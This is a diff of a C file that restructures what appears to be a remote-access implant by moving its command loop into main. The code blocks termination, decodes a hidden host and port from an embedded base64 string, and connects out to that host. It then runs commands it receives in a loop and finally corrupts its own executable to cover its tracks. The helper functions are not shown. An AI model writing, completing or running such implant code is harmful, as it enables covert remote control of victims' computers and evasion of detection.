@@ -36,8 +36,20 @@
 
 char data[64] = ":data:string:";
 
-void interact(int channel)
+int main(int argc, char *argv[])
 {
+    prevent_termination();
+
+    char *input = decode_base64(data);
+    JSONObject *json = parseJSON(input);
+
+    char *host = find_json(json, "host");
+    char *port = find_json(json, "port");
+
+    int channel = open_channel(host, atoi(port));
+    if (channel < 0)
+        return -1;
+
     while (1) {
         char *input = read_channel(channel);
         JSONObject *json = parseJSON(input);
@@ -53,25 +65,9 @@ void interact(int channel)
         handle_command(channel, cmd, args);
         send_channel(channel, token);
     }
-}
 
-int main(int argc, char *argv[])
-{
-    prevent_termination();
-
-    char *input = decode_base64(data);
-    JSONObject *json = parseJSON(input);
-
-    char *host = find_json(json, "host");
-    char *port = find_json(json, "port");
-
-    int channel = open_channel(host, atoi(port));
-    if (channel < 0)
-        return -1;
-
-    interact(channel);
     close_channel(channel);
-
     self_corrupt(argv[0]);
+
     return 0;
 }
